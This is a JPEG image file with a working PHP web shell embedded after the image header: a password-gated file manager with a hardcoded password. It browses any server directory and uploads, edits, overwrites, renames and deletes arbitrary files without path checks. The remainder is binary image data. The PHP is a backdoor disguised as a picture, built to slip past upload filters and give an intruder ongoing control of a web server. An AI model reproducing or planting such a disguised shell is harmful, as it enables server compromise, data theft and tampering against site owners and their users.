���� JFIF      �� � 

	

  ##3($$(3;2/2;H@@HZVZvv�

	

  <?php
session_start();

// Cek apakah sudah login
if(isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true){
    // Jika sudah login, lanjutkan ke file manager
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

    // Periksa apakah direktori dapat dibaca
    if (!is_dir($currentDir) || !is_readable($currentDir)) {
        echo "Error: Unable to read directory.";
        exit;
    }

    $dirs = scandir($currentDir);
    $folders = [];
    $files = [];

    foreach ($dirs as $dir) {
        if ($dir === '.' || $dir === '..') continue;
        $fullPath = $currentDir . DIRECTORY_SEPARATOR . $dir;
        if (is_dir($fullPath)) {
            $folders[] = $dir;
        } else {
            $files[] = $dir;
        }
    }

    function getPermissions($path) {
        return substr(sprintf('%o', fileperms($path)), -4);
    }
    ?>

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Simple File Manager</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #FFE4C4; }
            .navbar { overflow: hidden; background-color: #BC8F8F; padding: 10px; }
            .navbar a {
                float: left;
                display: block;
                color: #fff;
                text-align: center;
                padding: 14px 20px; /* Atur padding untuk memberikan ukuran yang sama di semua tombol */
                text-decoration: none;
                border-radius: 5px;
                margin: 0 10px;
                border: 1px solid #fff;
            }
            @media screen and (max-width: 600px) {
                .navbar a {
                    float: none;
                    display: block;
                    text-align: center;
                    width: 93%; /* Tombol akan mengisi lebar penuh */
                    margin: 5px 0; /* Atur jarak antara tombol */
                }
            }
            .navbar a:hover { background-color: #fff; color: #483D8B; }
            .navbar a.active { background-color: #4CAF50; color: white; }
            .system-info { float: right; color: #f2f2f2; margin: 0 5px; }
            @media only screen and (max-width: 600px) {
    /* Tabel akan memiliki layout block pada layar dengan lebar maksimum 600px */
    table {
        width: 100%;
    }
    /* Menyembunyikan label kolom */
    table thead {
        display: none;
    }
    /* Mengubah setiap sel menjadi blok untuk tata letak vertikal */
    table tbody td {
        display: block;
        text-align: center; /* Pusatkan teks untuk tampilan yang lebih baik pada layar kecil */
    }
    /* Menambahkan garis bawah untuk setiap sel */
    table tbody td::before {
        content: attr(data-label);
        float: left;
        font-weight: bold;
    }
}
            th, td { border: 1px solid #ffffff; padding: 8px; }
            th { background-color: #f2f2f2; text-align: left; }
            .writable { color: green; }
            .not-writable { color: red; }
            .hidden-form { display: none; }
            .form-container { 
                max-width: 600px; 
                margin: auto; 
                padding: 20px; 
                border: 1px solid #ddd; 
                background-color: #f9f9f9; 
                box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); 
                border-radius: 10px;
            }
            .form-container h3 { margin-top: 0; }
            .form-container input[type="text"], .form-container input[type="file"], .form-container textarea {
                width: 100%; 
                padding: 10px; 
                margin: 5px 0 10px 0; 
                border: 1px solid #ccc; 
                border-radius: 5px; 
                box-sizing: border-box;
            }
            .form-container button {
                background-color: #483D8B; 
                color: white; 
                padding: 10px 20px; 
                border: 1px solid #483D8B; 
                border-radius: 5px; 
                cursor: pointer;
            }
            .form-container button:hover { background-color: #fff; color: #483D8B; }
            @media screen and (max-width: 600px) {
                .navbar a { 
                    padding: 10px; 
                    margin: 5px 0;
                }
            }
        </style>
    </head>
    <body>
        <div class="navbar">
            <a href="#" onclick="toggleForm('create-folder-form')">Create Folder</a>
            <a href="#" onclick="toggleForm('upload-file-form')">Upload File</a>
            <a href="#" onclick="toggleForm('create-file-form')">Create File</a>
        </div>

        <h2>Simple File Manager</h2>

        <form id="create-folder-form" class="hidden-form form-container" action="" method="post">
            <h3>Create Folder</h3>
            <input type="text" name="folder_name" placeholder="Folder Name" required>
            <button type="submit" name="add_folder">Add Folder</button>
        </form>

        <form id="upload-file-form" class="hidden-form form-container" action="" method="post" enctype="multipart/form-data">
            <h3>Upload File</h3>
            <input type="file" name="file" required>
            <button type="submit" name="add_file">Add File</button>
        </form>

        <form id="create-file-form" class="hidden-form form-container" action="" method="post">
            <h3>Create File</h3>
            <input type="text" name="file_name" placeholder="File Name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>

        <p>Current Directory: 
        <?php 
        $path_parts = explode(DIRECTORY_SEPARATOR, $currentDir);
        $path_display = "";
        foreach ($path_parts as $index => $path_part) {
            if ($index > 0) {
                echo "/";
            }
            $path_display .= $path_part;
            echo "<a href='?dir=" . urlencode($path_display) . "'>$path_part</a>";
            $path_display .= DIRECTORY_SEPARATOR;
        }
        ?>
        </p>
        <table>
    <thead>
        <tr>
            <th>Name</th>
            <th>Permission</th>
            <th>Action</th>
        </tr>
    </thead>
    <tbody>
        <?php foreach ($folders as $folder): ?>
            <?php $fullPath = $currentDir . DIRECTORY_SEPARATOR . $folder; ?>
            <tr>
                <td data-label="Name"><a href="?dir=<?php echo urlencode($fullPath); ?>"><?php echo $folder; ?></a></td>
                <td data-label="Permission" class="<?php echo is_writable($fullPath) ? 'writable' : 'not-writable'; ?>">
                    <?php echo getPermissions($fullPath); ?>
                </td>
                <td data-label="Action">
                    <a href="?delete=<?php echo urlencode($fullPath); ?>" onclick="return confirm('Are you sure you want to delete this folder?')">Delete</a> | <a href="?rename=<?php echo urlencode($fullPath); ?>">Rename</a>
                </td>
            </tr>
        <?php endforeach; ?>
        <?php foreach ($files as $file): ?>
            <?php $fullPath = $currentDir . DIRECTORY_SEPARATOR . $file; ?>
            <tr>
                <td data-label="Name"><?php echo $file; ?></td>
                <td data-label="Permission" class="<?php echo is_writable($fullPath) ? 'writable' : 'not-writable'; ?>">
                    <?php echo getPermissions($fullPath); ?>
                </td>
                <td data-label="Action">
                    <a href="?edit=<?php echo urlencode($fullPath); ?>">Edit</a> | 
                    <a href="?delete=<?php echo urlencode($fullPath); ?>" onclick="return confirm('Are you sure you want to delete this file?')">Delete</a> | <a href="?rename=<?php echo urlencode($fullPath); ?>">Rename</a>
                </td>
            </tr>
        <?php endforeach; ?>
    </tbody>
</table>

        <script>
            function toggleForm(formId) {
                var forms = document.querySelectorAll('.hidden-form');
                forms.forEach(function(form) {
                    if (form.id === formId) {
                        form.style.display = form.style.display === 'none' || form.style.display === '' ? 'block' : 'none';
                    } else {
                        form.style.display = 'none';
                    }
                });
            }
        </script>

        <?php
        if (isset($_POST['add_folder'])) {
            $folderName = $_POST['folder_name'];
            mkdir($currentDir . DIRECTORY_SEPARATOR . $folderName);
            header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
            exit;
        }

        if (isset($_POST['add_file'])) {
            $file = $_FILES['file'];
            move_uploaded_file($file['tmp_name'], $currentDir . DIRECTORY_SEPARATOR . $file['name']);
            header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
            exit;
        }

        if (isset($_POST['create_file'])) {
            $fileName = $_POST['file_name'];
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
            if (!file_exists($filePath)) {
                fopen($filePath, "w");
                header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
                exit;
            } else {
                echo "File already exists.";
            }
        }

        if (isset($_GET['edit'])) {
            $fileToEdit = urldecode($_GET['edit']);
            if (file_exists($fileToEdit)) {
                $fileContent = file_get_contents($fileToEdit);
                ?>

                <div class="form-container">
                    <h3>Edit File: <?php echo $fileToEdit; ?></h3>
                    <form action="" method="post">
                        <textarea name="file_content" rows="10" cols="50" style="width: 100%;"><?php echo htmlentities($fileContent); ?></textarea><br>
                        <input type="hidden" name="file_to_edit" value="<?php echo $fileToEdit; ?>">
                        <button type="submit" name="save_file">Save Changes</button>
                    </form>
                </div>

                <?php
            }
        }

        if (isset($_POST['save_file'])) {
            $fileToEdit = $_POST['file_to_edit'];
            $fileContent = $_POST['file_content'];
            file_put_contents($fileToEdit, $fileContent);
            header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
            exit;
        }

        if (isset($_GET['delete'])) {
            $fileToDelete = urldecode($_GET['delete']);
            if (is_dir($fileToDelete)) {
                rmdir($fileToDelete);
            } else {
                unlink($fileToDelete);
            }
            header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
            exit;
        }

        if (isset($_GET['rename'])) {
            $fileToRename = urldecode($_GET['rename']);
            ?>

            <div class="form-container">
                <h3>Rename: <?php echo $fileToRename; ?></h3>
                <form action="" method="post">
                    <input type="text" name="new_name" placeholder="New Name" required style="width: 100%;">
                    <input type="hidden" name="file_to_rename" value="<?php echo $fileToRename; ?>">
                    <button type="submit" name="rename_file">Rename</button>
                </form>
            </div>

            <?php
        }

        if (isset($_POST['rename_file'])) {
            $fileToRename = $_POST['file_to_rename'];
            $newName = $_POST['new_name'];
            $newPath = dirname($fileToRename) . DIRECTORY_SEPARATOR . $newName;
            rename($fileToRename, $newPath);
            header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
            exit;
        }
        ?>
    </body>
    </html>
<?php
} else {
    // Jika belum login, tampilkan form login
    if(isset($_POST['password'])) {
        // Password yang benar
        $password = '290802as'; // Ganti dengan password yang diinginkan

        if($_POST['password'] == $password) {
            $_SESSION['loggedin'] = true;
            echo '<script type="text/javascript">
            window.location = "'.$_SERVER['PHP_SELF'].'"
            </script>';
        } else {
            echo 'Password salah!';
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
    </head>
    <body>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
<?php
}
?>##3($$(3;2/2;H@@HZVZvv��� �R! ��              ��     �P                                                                                                                                          ��G��            ��2�����gb�:�          �������f�~0�����           v�i8s.�����ό|('˵߀          w:����y���n�8�ڻ��1�         �s ��V���t�F�I-�eƾ_�c{y�          ��l�}9�̽�ҩ���[������s��          ��\_K�e{��<�<j� ��Z>���^          M��*w��%����A��ÆD6�l�MP          ���[u�/�W�_m^'8�]���� �\/         �����n�6Z�1��V���	�7����          ��2�YY�E[��ِ*Kcm)�nL0          ���h�?螚xw�������vw��          gZ?JT���o��b�k=�n�����^{.t<          =l��������#��cM�� �/a�          s+���^#���lJ?6��+�.�����j�          9�� .#���["Ԯ�M��Ū5y�>y�;]H          O�����Y��lzH�xv�$���          �����(n� ��M�k�����?�x          s����oL-FW��+����潔�         s���j5�9v�K��Ȃ�0��x�4�M          �ҕ|sQ��xC6����.��f��6          6L�ګ��
�X�|�\;��^{��M����8          ��g�h�����ǌI�����<��Įjo0         	_��+�W����?�Z̾a��}fI,������         fZ�ދ����Wؚ��W@[�ו�G>���M��         p]�|^��m��q��yF^}u6�ڼ�i,���q��         9�>��´U��O�$W�k���|�vEq�g����         e��'��:]�4nE����,��{#�.|�M         ;�˶�틍�\z��-->.����E�Y�
>GR��         缯�� �������)XU�W���1���1� S��#          )�VǱ���������m��^Q���-�Uee���         ��+d�;�|�J���UTo��[��[Γ�g�         ��O��f��� ����8n�s�[�]C@ͫ�          ;nz�#���v:.���֎i������w7�<          {;m������~�����"�|َ�az�>�         �<I#޽��� U�iӐ?�,���n�K���          {��������i�4}{��^�㮉��H          ���x��'�TG/��)���          �w��{-��y�                                                                                                                                           ?��             ��                                                                                                                                       k|�      7D|�s     �!�n��     �2�n�      ���W��     ���>y     ��È     f�      �D                                                                                                                                                                                                                           ��             ��                                                                                                                                       B�     ����     ǯ.�     N};��      ���     �t     �n�      r��     <w                                                                                                                                                                                                                           ?�� 0      `!1"#2 3A�$Q��   � �f�ς����az��E���ˌ���j��ok�~� ��G����ԍ�Ҍ~�
2ݾ���$�m~������ɖ�=ϓ[V}[�ю�V��u� �X���vi�{��[��� �rښf����OhB�y�s�ְʘ��R�W�~��錕��O��t�~�E�旺<��F�	z\v���~L�H��33� G+ɽ�5J����;�H��_���i�ײR#-��\ښ �	���5��y�� N��(�/{��k^o�o}ڄ<g�4�)O�O?�X���x��fi11>���S3�'Ƈ��j��h����2l�=��� O_���	2B�Hţ���3G�_,�3-�Y(����9ZD�M�
��X������Q�/!뎹�'w}�����W��~l�v&�n�Yը����b���t�-W!�J�0|ح`�p�'(M,�����$����5@�%`1PĮ�~��!� �������b?o��e�i�G�i��U�ZBV����&��f+� ܏��)�&�  �_��?�k��o6�.�ąf������W�jhv� R��̹�t��;�}��*�Wf&���U~�BǷ��?�>E�<�-�`R�Я3VeP�@`_�*���D�1�����E����n~-)�>� o'����O��O���	0�o|o���G�3V��K	�s4tEQ9��A�T��KM��P���1����O����X�rʭ".�uYvh�2�w W�̽�g��~p٧���~i�H�c�+��� 5rt��1�T�`/����V�I[� ���� ��>v����SLW[]���J� =��dm�����Z�6{D�^���5u�J�`d�@�E�z�����y$2_�^=�qeWb��R�᧩]_���M�����\潪Z��!f"�W�ȴ�fikV}V|E7�'9��A����_۴�����b ����f~��IW1�E�A��:RĴV��l�*��VXz��ޔ=��4�}>+ۚ��}�.>C�)N*��\Ps32���ۜ�P�.���n�f��A���6�@��)��Co�l�F���$U�]`W�LLO���y~WC�����c���c��R�D�O�?�Q��Mg�~�����ꙟr޻Q�ZF��$�>*�u��� 6}�z2O��Umz�
��B��w�tv�n�Cv��/!�E<� {jV���\���-��jS5�}v�ؖ��ڗ���2������W7�G����g��$L�,c�����q��Z��K�2h�{6�����y��!�� my��1�ӫ,�e�����g3��M����q(�h�ʺ��U�uŴpވ}�-�I�m$��b|�=o���m����������|�?fkqO�䨚���k�c�\:-��s���.vP��2TA���P�7'ٿ�dCMg�*�hG2��'?��r�V_����F �5;b8��0T���z�+ڭP������+��'O^^bm>��!�D�&���-i�/x��,�.������� 3���W���+k�GB�x��E tr�`蔗	�B�Ej��a�V��k"�7d�T)�lR�:������g!+5HWڅ���C�� �����U���13�Ώ/��MR���+3Y������􃎢���M�ߊG�OO�+ʦ�5A����=w��mi��}9�M���\.ܢ�-��t4z�Q�Q�Rp^]e�0�qa='/JYP���5��}@2t�=#;����1~����$��V����ţA��w�?���V����Đ�扟�G����q������R��h� �m��Z�̈́�؍�,��"-І�Nݐ������i �ic8�,E��S:��T�SHN(���*��K���q�NQ����� @��r��-���*��v���o��|��&C�Y��~>��u�0��m� ����mw���y��	M��#ie���Bf�(fIO1t���(���ч~�?�������A�����2�L�r��"�Y��~*��g�5�j^~�[��:�s�\z����W'F�:+9^�������K�O��a��G�{��F�Kh����K��(G]��	���!e�&(t��z��^����C5�^{a�A�<B�'�l�i0X�5��@����w�?R"e���'=f��{���=�:䳟��&�"�\�?��M�XM����:;�,|UǞ� ��.mi��o����1�y�M�]���.��M��o�Zז��F�izKzFdp*���R����w�����"���EX?�m���'E԰�imj/z�M���9�)+���y'.�&�EAM\�"�����M'�!!H�>`��]� ��BȮ�;�b�\�wdW.�w=hob�:���UP�~�8�t1�rX���ɏ��Mg�|���o>O͕�B�[�X'<~&���
�P����;�G�ȭ�"�c�� {8���2��0L�F�0�r�S���̖����k�Z_�^ȋP��.�7�<��:Jʹ&g���%)�b<��|���+y����y�Q��9���䦽�/a ��wۿ��K��h8�����/7|�+~�^ݪS������K�d��nJ�V���_ �'��ċ;Q�T�^��Z���U��&j^� �=&���y�/ZRf"m3�oKR+3�띢�!�\޷�����cw���N��s?�,/�p�˫835��휳Ǟ�@�fb�;���W���H��I�Or�:��M������a����~:�,��tB
E��z̃�!���.6��~���WT�J^io�_s1�E�ʂM��6�+�!Ync���7�I�N��\���Ah��������qyX��5��P�X�nh�7�T@�8�]���V�}Cg$/���4���e����h[ mp�v���h�M�^�%�9��������;E�{Q8�/s�,�KZ�^��o�?9�!�-E9��;U����s�.h5mE�P ~H������ޱy����5'�XW���r�~���)��"LO�	,~A�/���Q�`�f�y5�c]y�ޢ:��,��a����'7I���� ����7� Zx�Y������;�����u�����5,�&G�\���S�s�1�x�C>ag-�<m,�ܖ[3�&���:��c�iX\�'k�O5G#�y�~��l5� :�E���t����x�"2�H��8	�1ڵ�& s:�YƲo�&4���M�6�e�r;;8lh�P�Y�����k[i���N�S�J�Ṵ���D�xI���ἌF[�_V�YTno�\���G~�w��=kt=_PvyV̓T�{�8���������䆍���6Qro��z��1���������J���ܦ@n������u��I4X������_Q�&A���&S9׍H����� 6,	6�L�C���=�)E�}͛����%o��vJ���5H�"�S�����ܧ�\����0E��W���nk���;�ژ]�/B�d��[�����s> s����sJON[�����#������[ 6�w��X�|y�w+V��W|�fV��K1�`���m���?D���\� ���:,��t9����W�r�������RR�\��v��8�i�0�]5��5���1���2�5�3t_l,�w3�������';�/y�l3K�2]����&8|zi,�)<N��T�=T����-����|'�^ǝm���s��6��3�U7;����`m�{w������ �,3D���pG��7,l�rˉ�Y4Ɠ���� "�v�<��s=5�U�S#s�A>�^�3ť�XxN�� ����)�8����s�س;n巶��>l78������nq�3z#�f��x	y�� :b�_F�&�B����
^ԵmlRL��Ӝi����x�nQ���bШ��Tq�G9N�V���b9_�y`����:I��ҷ��4"�N)��ޮ\:.������o>�]s_�e�Z�����K�����^�5����(�E�a�e�����u�� �YG��-�?1���������?����Nr���S��:�:%����z)��Q=>�*]�âo�3L�(����!K�!ڡ�x2�����z#��8��NgS��%�¬ug_?�C=;Th
Ԝ��������� ^-��V��!r��6����d�<W���,�ZJ�Z�77��)3�t�E�Y��~Ӂ��Y-wT�q� )�>I������I�n�{�Ǳ>#�f2k�̸�,O�1�n�Vc�,���~��B�C,�$�f��'�RGh���00i{�`�#��/�����M�7A��V�K��'��	u�� Dh��L"���j<k!Wyb�^������J��w�ϻ='�R��������� ��O��
�G�u�j���@�%��ƙ.0*-TH�]A�k �����Eu�v�G��S�Z����ސL,�h��Q�Q��3�([Z��Z&'���w%���:-�/�r�}{~�A0n�A�q�eO��������Qt��>�.�L� ���D������5��yډL�V�/���o�X=y&��K����DU�*ҍn�AI~�}�9SGG���j�ƫ'e邶�/��z��g艉�[���iG����y\��;�O�����0��NN�;�[���"�������3�E�߉u�S��,E��{ث:��ڀ�PV��D���� Ai7���֥E��&�Yp���k�Hb�ޟL��k�&�K��M}p l��-�dM���z֢������
ٷk�@È��e�J0`3�#ߺ^z޻�(h�rhs�>�{�B�`D{�PV�^&I>�����~3KlgQ�W�0I�Ȋ�z��f� N� ����BE�*�S~�ω�isb|sA�3�#YK4�����n����9�^�V��/=�.���VFJ?����o/8�)��rT�\��C����?o^�Y�3�chMSzs�,�O� ��ͨA���'�Z��Zb�7�W�(��.Y'�_ ��Ҋ��͢fi�\�}�7Ӑ��U�QkA�Zf�o&|�^��C����xm��J�+1��g׿"}{�__LǗ��G����Lz������鑎�<
�%��vKR	o:�\(�M-�!�K]'2��G��z�F'�{�g�TG��LLz���O��r8����>���� �@�7(/�E�A��U�0_>�� ч�� G    !1"AQaq2`#BR���3b� $r����4STcs��%���Ct���  	? � ��4�~!gb��U���f��e��9��Kh��$*X"�.��3HR(Ƙ�ի@'Q߼�ri�N8�i'����QLM��@�y��Ia8Pyђ��KI��l)D��������oV���TEʕcĶA�A$���,Q��g���I�h�� i]?�Z�8q���>��,I�)�C�����!��}�w﨑<��ߛT�s״h��ǣA�+��uA�Z�a�t�0�
#
�\_�J�����%6�Fɷ��т�?�Ԟ���Z��l��[�-JC������|�
8�[�p{^o���-X�ӟ�b�U�c�� [P�����*ˍ�(p�ޔ<��-dI�{��F����
�;�1f$�I�$� B��PN���Q�iܔW������QA=Ku {���ϰ~t�85�ylz���Wl1S�pA����)�AH� iL���4v0�J�u��������(�Y� �/#gC����/5��Ǉ�p*�1.0yg}�_ĈcS|O�M;ޖ�G�jK�d�5��@a�6!=�Aq.�Y#�J���]�J�N�5l�O><zL��}��udk+~)�*Y�T��%5ş)c����M�h�I�2�m�M.75;�,L��А:��ĸ�2��J�l��w$P��!�<�Llp�}���p#��H'����p[�>'ki��s��V|9h��,�:���M��n���mk#v���Y:�i�6^g#�����O7�?���ު��f��o��_���D����a�+��H����NZd�c
���wQ	,��U��S� .����=D�J~W�m����q��������aެg������^��p�� 5��/8&��n+��[u�YR�/��X՗��8Cpˑ� z5M=��8�b4c���1�����$�r�
�,.�K�� fs�ҷ��04p5���������H�(� tt�C�z�h���2�z8>#�CN�s�)9tc� (݆I��U���]>�� ���p���q~d�?�F��0hr6v��
�(�FX&���} w��S,60I8�����X�O��f�����ۉ���H��Ux�a��2�=����!�M�'6�ϜD��ul��tD[\3�� /��C�����V��>^^+D4Rq���h�S�֗ZK��=[NF<E>��8]񗍶�c��|�H#��.# (z:.s����ocj�?�`?#QB����]�Kim��ń}� mF���Qᓰ�V��	�'(��^Z�������7�%�^v����j����	��e��Q�[_O�+�ܯ�ͺT�����7��Q��ɚw����o�ڵ���տ���� ��~��x��X9�RȮ��e�uղ�� ��� ��Ԁ�Q�L�eضr�١�H�G�4�2HT�q��#�Ɣ�e�@bA�	o���U'���t=T��h�YQʑ�<����K��<��ȒF�h�i��Ԡ�:kqY'��� ���Fܭ{o�擟��2�CΤ(�g�����āQk׃�e�l��q���#+��s�{�ȧC���3�Z��q��N�O)�ᵖ�+��MH�c}�6ǘ���=냽wӲ���T6�d�bjէ���63��~-�W��ja1��,ä�J�̿�Buf�j8�>�M�YA?ΰ!�@f���r�3���C�U�A�y���1  2I5��~�b�v#*N7��Wq� h�R|n�(���.%X!��9�{o�d�@7&K?��N���]3ܱ�:�9k��[c���J ]���~��A4Y9<�\�v�1����ߠ� u� n�n��h_t'�J	 �ƪ�q=��U��4��@�>����+�ܷ���VS���r
�'5d�L����P�bO]&�8��Dm&R�'F��rX�Vb(��#��̑��Q��[8��Ѳ�k�z��
��-[�,��D��R�o�q���0s�G���4�ᒱ�E�,��I0Z�¼h�
�Tm_�{?}o�)7h�` �8�ğ�\K�}��w��Q�����R�,}M,k
��b0=� ԡ��O>�F*��N��>J����D���N!��A���������#�8'#7u�kV+��H.}�KW�a,N�o1|�#d4���Q4���Z��b����l�S��
�U� C��x��K=����k\����{���Q"���sٍrT�-X�b���$W!�1»��T}�oG.vP< � �<�?qȇ��
�� 6����dwKjA� ��ߗ:��"������ԱP��T� �֢�����Թ��|�3αp>�0j�b��;�EX/�/�Xm��+���OͳE�+�X��ή��hͷ :�u|f:�9�C�$��.!�(������PqQ�i4#[�6$]1�T��P%ď�H���k�xnNEp���k��X��Hn�!4�x-p���K[�D��Kp�>)Bǐ�u ��k��\f0[(�U�Q'*I U��A�%�L��qY���D���n5|�c��=6Z?��[��9x������Mv�GmKlpq���+�Щ�!{ҰK�g%��Β:�u8e�Ɲ�:v� S!G+I�H�=��*�"�"	�\\���]d��(Nq��w#a�R<wb왠��E@ʻ�ؓ]�����ŋY����(�mZC�
�	!�k���5jR9o%�B��uh#*z�+��uok*@�l"��˺>DۦYjIݛ�H��JH`L�H&��)yz��=H4�x�҅�Z�U sF·g��g8�k�lT�_ߦvPrC@�	_���P�w�}�Z#b=�wPGQ�~���IO�%O�8��_>���8�Ϳ$��2�ʝ�~{U�����j��<i���~xH�?��d,`I"�Gm��3��@�*o�s����SpfM���AK�Z8�R�^ip� ݪ�k;�dt���dOu�Cs�Gic@0t�Xm�u��JbIVS���rO��Ks4p���m��c�J��P�벉 ���𶠵��t�K�*�J�Mv�ꎀj�2Uh�e�9Y��Ӎ* ���@J�*�'�}�+��U��P�Mo<�A$FEmF8��,c�[�#�k\��T��-]�q
�l��V����v�w*)?�q�#pѷ�����^�ⱇmk��~��}����5��H�'�S1�F���g`O~ʼ6]o��
0�!帗�v#�p�~rs�I����N0%�({��9�e;�U�P�D��9�s���噃�*�����R �Ul�T�s�Q�P�����L���C�1�U��z�B8����9�K6�+vEur�T��;`�
��Ş[�i��P��'�+�T)'��0����n�W`��V�L��cC�W`框�^2�`�W=�8�cQ{��tl4����W�ۨQ��8se�S٥��4���n���3���z3�NY��3�Iܒkg�����ȄU�跂@��(#�|]�=�ٌ�
�d��=��ƥ��ue\g9���Y�c����	uD�j�G�0�<x+"��K�H;ڧh8_
��? �ç#~�B�
��(x&B�s�F>�H��M�꒾[1�z?<V�]�r��I�'��S���鏻����G� �]"^����ăQ��ȮkHU_N�N@'H�#�ѕ��^D�mӪ�f,H�XЊ'���Ʈ7n�^Y&:����z�a
� �����ۥpۉ���<�+��� t�m@>�9/���5hX�5�I���t2I�Pǻ��zK���0p��#�w;/���c��p��äK��u���e��L�6bs�S�N�E4���]AW��q��:�Q�;rÕ��?X�N�	���'*��1�`�Zx(����)p��c ���!&3V�)ԙ.� �mC"��:@@������}�HygԲgu�#B�mָ}��l�[B�����+�?��m��|��*�����<^��_� ^���j�I����,�]ݛ�1m�?��iR4�rVLrĲ����G�4���6�ѫ�Eё��3|��sL�L�+S]�;8�?+F�r�-���vdo&W��h'Iz<R��`|tt�'f�yАA��3���7Ŗ��}����5osm4G+<,A_0�PAs,�2{�1����Uq���ў̻b4x�1o,"�"Yɬ,>v��A\
���#U�� X�Ee��]6Coce�i�qN!w�,����CO������0��Z/}u�*��M$gǷ�O!W�@'�mXI(#�댬b�TBI d����(������)�-�e�(��g_���Q� �ԁ��\����5�:��:I��L�;�W�1�.��QʟvE;0���^��$�s��P��u݄��Rc ���`��{�#�L1�:��m_G#2�]@�%h
�tGuS\?�C�4�?��ߗ�õ�FjX� ��&�Wf��D�W:s��_�d���n]�6ꌬSKkvт+����x�F���E�q�m ���� 	g�p{����o�~!��\N[�K����l���dq���(�㶶��O�g%ϛG!�$�	1�j?�]�)�~��r�<�l�����d����R���]t��R�t2�B�M!¢�WQ�X��1�h�.��k��� x���� �#Үg��9P�-�0��O��^@�_C�Y�������B�a�`� �x�?���.#u	���W		W��GV��[K76k�2�"Ħ����1۴�#��
��Z���k�#��d��	U�]�6������R3,���.�9�qk�%��� ԍ#�VrY��>��Ƈ�������<4�	�	��	*-@�+x�aH=w��>T�KG�Q�.���%w*�#�}cIT�9�&�[f��QU6BH�8�ռR5���/���T��U�k�l�E?Qf,wlդ���*Va�˸e6$���g��x�T�b%B�8����n�dD��cʍ�K�~ j����%�уp�c�eƴc��F��U���k�ዢW��7���m:c���ql�O���-T1\��f2����2�s�\+i��ߪl{�*E�>���HR�EX�)wf9bza|���C*��H?)���x�"�K��+�q�z�%�'-��˃�<��)K?s }�ؚ�[�ss��r�c��+��H8�x8&�	/�V���	�W8%N0<A�I?"q$/ʘ����&T�]�����V"6x��`�e9�����ˇ��V:�}��k��qh��Ǐ�q�$Jk��"8%u�I����Q_I8�>�=�9�ޮ���@�ƬʭR�)�y�@cP���D�H�
�2M8�ڶG)�(.�j�E����4m��&M���<n4������rzGY���@,N�O�]��3I�a-�#�86?��I����I�^D!�UKjp	�F�ۉBt.Cde��X�o��᳻�G9�F�F�TZn8|��F:Df���dW��+B��<rh%yE�� }	S�S<D�f{�y�E����XV���5,ˣ,bTm)��U��K�ي� ;���nf%(�$��*Ǡ�o�MY�Ò�+�y/�6�����aB��g�f1�	0U ��8#�I&��u#��:�Pȴ�k�{[���ǋi�6�����0t(F�
��m�񃖗rU��*ۿx.#+�4���8�*)��QN����.% v� ��_o��8'q�k_|��}��Q�G��pd��@~�VN*$_xQs T�5O��=ۚ����)r�J��.H�87����f>��7�+�L���2��$���j.�VL����w=�>>�,����P����L��iB\H���i�(�#���1�|6���Z𪱤�r2�x^���H�W�q��q���c�T��L:�) �Lp[^K ��uC.�P�3�Dw�sq&��3��k��L��;x5�Y����[p(�x�1g�»ۡ`ǝ.�J��:EZ76$E�el!1��e;
�e`��m���$��Q�U`��i:�r��U�(v
.54��M�Ⱥw`�n�A�����-�7|�z�+V��m�H���x+n���b!dq��|T�������[�s����	k{�=�}܂����3���� �D�)]��}"��l1��5\�g�bi�*�L���J������>�cB���K���ݜo�t���[U�E~lX�\�)v�U$C�a��]z��2Mb��59Aٖ�B6&p���R)�8��60�/�:5*����	1��}�eB�d|vjK������ē��׸iLxo4�ݨDEL�]ErO\�[�]h�A�P�pgr[�+�G�D�<OĹ&im�#�ap�6�޸\�H����v�����$u6�2Ÿ(�P����;�$mX�#�q�a��B'hn�$*C��AI�
�|c���uY��+t�R�W?~������;�IB����H��/or��Í�x�o��Y)"����1딍l�7	�
y:S	\g��A��?��&ڹS�4l��]M9ya��'cմg�7Ǽ�t��$V�O��I��W�T[�aO�蠞?]��-,o{ �Td���}���j��:��ɷ��G� ]JIR$���DE;��a�2�9K@��I�j�p]��V_�q���uu�r��X�.��y!հ�K���{1ަϧ���S��7V��� �mMs+:�x�(�ڎXU�Egі�	������v'&�E��(���ܦ��"���p�� �
����k8F	bԂEWK� �#4Vk-��q�4�7'5����`9�HQW���D;��ۈX�-��+�j��N��[H׈F�q<+��á>5{��߲�  ����B-Z�t\=xW�4���7?ۍ�5����/�&C�X�0��KQ�խ�B��Ǽ��l�����3Oj��R�C�++`�ք58��HCٖ;x�����YZ�m������M�X��U�a�G$��q���̠G�L;��Βg1^�+�C�������v
HV� Ue$mH��Φ�� )��95?*p�2�r�0J�)0 �^���T�*�eJ�pA���T�W2��L!�]�{8�cڋ��4��� �d�s%�m"Ɯ���[We��#̊b�:8���b}	��la���H�Bg� ��u� ���HXծ��0�2�8Ԭ�vaO����5WI!Կs��j����Iy2�m�(�,8��	ٮC�2�j�F:�rĆ9;棕a����sD�IQ���B�Q���Z���ě���q���fV���N^�)g�	PN�\��g����X�~B$x��.�����9Ԉȝ?r�HO�ף�� ?�x|���>ucJ�����S�kbwyG@z��.��nJ�:3�
